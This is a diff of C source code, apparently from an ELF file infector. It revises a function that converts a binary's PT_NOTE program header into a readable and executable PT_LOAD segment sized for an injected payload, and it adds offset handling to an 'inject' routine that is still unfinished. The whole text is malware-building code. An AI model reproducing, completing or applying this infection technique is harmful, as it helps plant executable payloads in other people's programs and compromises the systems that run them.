@@ -15,10 +15,10 @@ int FORCE_INLINE metamorph_segment(t_data data)
 		if (p_hdr.p_type == PT_NOTE)
 		{
 			p_hdr.p_type = PT_LOAD;
-			p_hdr.p_offset = data.new_entry;
-			p_hdr.p_vaddr = data.new_entry + data.v_addr;
-			p_hdr.p_filesz = data.pl_size;
-			p_hdr.p_memsz = data.pl_size;
+			p_hdr.p_offset = data.bin.new_entry - data.bin.v_addr;
+			p_hdr.p_vaddr = data.bin.new_entry;
+			p_hdr.p_filesz = data.infos.pl_size;
+			p_hdr.p_memsz = data.infos.pl_size;
 			p_hdr.p_flags = PF_X | PF_R;
 			LSEEK(data.fd, sizeof(p_hdr) * -1, SEEK_CUR);
 			WRITE(data.fd, &p_hdr, sizeof(p_hdr));
@@ -32,8 +32,13 @@ int FORCE_INLINE metamorph_segment(t_data data)
 
 int inject(t_data data)
 {
-	// get file data
+	u64 offset;
+	data.bin = get_infos(data.fd);
 	metamorph_segment(data);
+	offset = LSEEK(data.fd, 0, SEEK_END);
+	/* align */
+//	WRITE(1, "\x00\x00\x00\x00", data.bin.new_entry - data.bin.v_addr - offset);
+	
 	// memcpy
 	return (1);
 }
